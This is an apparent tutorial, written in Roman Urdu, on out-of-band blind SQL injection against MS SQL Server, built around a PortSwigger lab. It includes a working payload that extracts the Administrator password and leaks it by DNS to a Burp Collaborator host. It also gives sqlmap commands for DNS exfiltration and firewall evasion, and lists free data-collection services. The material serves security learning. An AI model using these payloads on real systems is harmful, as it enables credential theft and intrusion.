### OAST Direct Data Exfiltration Logic (MS SQL Server Misaal)
Jab ek baar confirm ho jaye ke target database external DNS request bhej sakta hai, toh hum puray ka pura **data (jaise administrator ka password) direct domain name ke andar concat (jod) karke extract** kar sakte hain.
Is payload ko **3 simple steps** mein samjhein:
```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--

```
 1. **declare @p varchar(1024);**
   * SQL memory mein @p naam ka ek temporary variable banata hai jo text store kar sake.
 2. **set @p=(SELECT password FROM users WHERE username='Administrator');**
   * Database users table se Administrator ka password nikal kar variable @p mein save kar leta hai (maan lo password S3cure hai).
 3. **exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')**
   * Variable @p ki value ko domain name ke aage jod diya jata hai:
     //S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a
   * Database is complete domain name ko resolve karne ke liye DNS Lookup bhejta hai.
### Result Analysis
Burp Collaborator tab par jab aap logs check karenge, toh aapko aisi DNS request dikhegi:
> DNS Query Received: S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
> 
Domain ke start mein jo **S3cure** likha hua hai, wahi aapka target **Administrator Password** hai!
### OAST Sab Se Best Method Kyun Hai?
 * **No Brute-Force:** Aap ko 20 characters ke liye 200 requests bhejne ki zaroorat nahi parti. Ek single query mein poora password bahar aa jata hai.
 * **Fast & Reliable:** Fast aur reliable method hai kyunki time delays ya response errors par depend nahi karta.

---

### Real Life Mein OAST SQLi Kitni Common Hai?
Real-world web applications mein Blind OAST SQL Injection **zero percent nahi hai, lekin rare (kisi hadd tak kam) zaroor hai**. Iski wajoohat yeh hain:
 * **Beginner Developers Ki Mistake:** Beginner developers aam taur par direct SQL Injection (insecure string concatenation) peda karte hain. Lekin woh direct queries (jaise SELECT * FROM users WHERE id = 'user_input') likhte hain, jo web server ke same thread mein chalti hain.
 * **Asynchronous Queries Kab Banti Hain?:** Asynchronous ya background queries tab peda hoti hain jab application **Enterprise level** ki ho. Maslan, jab koi heavy analytics, background logging, email processing, ya queue system (jaise RabbitMQ, Celery) background mein database inputs ko process kar raha ho.
 * **Egress Filtering / Firewall Constraints:** Modern enterprise environments mein outbound network traffic (hath ke DNS / ICMP) ko strict firewalls se block kiya jata hai. Agar target database server internet par bilkul out-bound requests nahi bhej sakta, toh OAST injection execute hone ke bawajood DNS query internet tak nahi phonch pati.
### Burp Collaborator Ke Ilawa Best & Fast Free Alternatives
Kyunki tum Burp Community Edition use kar rahe ho, is liye Collaborator feature (jo sirf Pro Edition mein hota hai) use nahi ho sakta. Lekin **Open-Source aur Free Ecosystem** mein is se kahin zyada fast aur better tools maujood hain:
#### 1. ProjectDiscovery Interactsh (Sab Se Best & Fast Tool)
**Interactsh** aaj kal cybersecurity community mein Burp Collaborator ka number one open-source aur free alternative hai.
 * **Kya Hai:** Yeh ek free OAST testing client hai jo aapko dynamic subdomains (xxx.oast.live) deta hai aur DNS, HTTP, HTTPS, aur SMTP interactions ko realtime listen karta hai.
 * **CLI Utility (Terminal):** Tum Kali Linux ya Windows terminal mein direct setup kar sakte ho:
   ```bash
   go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
   interactsh-client
   
   ```
   Terminal khulte hi yeh aapko ek unique URL dega (e.g. c123xyz.oast.live). Aap woh domain apne SQL payload mein paste karein aur terminal par real-time DNS lookup aur extracted data dekh lein.
 * **Web Version:** Agar Terminal use nahi karna, toh simple browser par interactsh.com khol kar direct unique domain generate kar sakte ho.
#### 2. SQLmap Automation (Real-World Penetration Testing Tool)
Real-world pentesting aur labs mein manual OAST payloads likhne ke bajaye sub pentesters **SQLmap** ka use karte hain.
 * **Kaise Kaam Karta Hai:** SQLmap ke andar builtin out-of-band features hotay hain (--dns-domain flag ke sath).
 * **Speed:** Single command se SQLmap background mein khud hi target database type detect karta hai, subdomains inject karta hai, aur seconds ke andar poora database dump kar ke de deta hai.
#### 3. Custom Public DNS Loaders (e.g. RequestBin / Pingb.in)
Aisi websites jo custom webhooks aur DNS listening free mein deti hain (jaise pingb.in ya dnslog.cn).
 * **Method:** Aap site par jayein, single click se free domain copy karein, aur SQL payload mein SELECT password FROM users ko is domain ke sath concatenate kar ke inject kar dein. Page refresh hote hi site par DNS log mein password print ho kar aa jayega.
### Summary Table
| Tool | License | Installation / Usage | Ideal For |
|---|---|---|---|
| **Interactsh** | 100% Free & Open-Source | CLI & Web Interface | Fast manual testing without Burp Pro |
| **SQLmap** | 100% Free (Pre-installed in Kali) | Terminal Command | Automated OAST & time-based extraction |
| **DNSLog.cn / Pingb.in** | Free | Direct Web Browser | Quick one-off DNS payload validation |

---

### Real Websites Par SQLmap Allowed Hai Ya Nahi?
Short answer: **Sahi tareeqay se chalana allowed hai, lekin bilkul default/aggressive mode par chalana strict rules ke khilaf ho sakta hai.**
 * **Bug Bounty Rules (Scope & Rate Limit):**
   Bohot se bug bounty platforms (HackerOne, Bugcrowd) aur client authorization letters mein strict rule hota hai ke aap automated scanners/tools se target web application ko overwhelm (down) nahi kar sakte.
 * **Server Load Risk:**
   SQLmap by default aik second mein do-teen-so (200-300) HTTP requests bhejta hai. Agar website choti ho ya server weak ho, toh SQLmap ka yeh aggressive traffic target website par **Denial of Service (DoS)** yani server crash kar sakta hai.
 * **WAF / Firewall Alert:**
   Aggressive requests se Web Application Firewall (WAF) jaise Cloudflare ya AWS WAF aap ke IP address ko fawran block kar dega aur SOC security team ko alert chala jaye ga.
### Real-World Penetration Testing Mein SQLmap Chalane Ka Tarika
Professionals real websites par SQLmap ko control aur stealth settings ke sath chalate hain taake server par load na pare. Tum in flags ko yaad rakho:
 * **Requests Ko Dheema (Slow) Karna (--delay aur --threads):**
   Server load se bachne ke liye requests ke darmiyan gap diya jata hai:
   ```bash
   sqlmap -u "https://example.com/page?id=1" --delay=1 --threads=1
   
   ```
   *(Yeh har request ke darmiyan 1 second ka pause rakhega taake server crash na ho).*
 * **Request Speed Stop/Control (--rate-limit):**
   Aap specify kar sakte hain ke ek minute mein kitni requests bhejni hain:
   ```bash
   sqlmap -u "https://example.com/page?id=1" --rate-limit=10
   
   ```
 * **WAF/Security Firewall Bypass (--tamper & --random-agent):**
   Default SQLmap User-Agent request header mein sqlmap/1.x likha hota hai jo firewall fawran pakad leta hai. Is se bachne ke liye:
   ```bash
   sqlmap -u "https://example.com/page?id=1" --random-agent --batch
   
   ```
### SQLmap Se Blind OAST DNS Exploitation Seekhna
PortSwigger wali OAST lab ya practice environments par SQLmap ke zariye DNS exfiltration perform karne ke liye tum --dns-domain flag ka use kar sakte ho:
 1. Free domain service (jaise interactsh-client ya dnslog.cn) se ek testing domain hash copy karo (e.g. c123.oast.live).
 2. SQLmap ko yeh command do:
   ```bash
   sqlmap -u "https://YOUR-LAB.web-security-academy.net/" --cookie="TrackingId=xyz" -p "TrackingId" --dns-domain="c123.oast.live" --technique=O --batch
   
   ```
Is se SQLmap automatic Out-of-band payloads bana kar aap ke testing domain par DNS requests bhej kar fast data dump kar ke de dega!

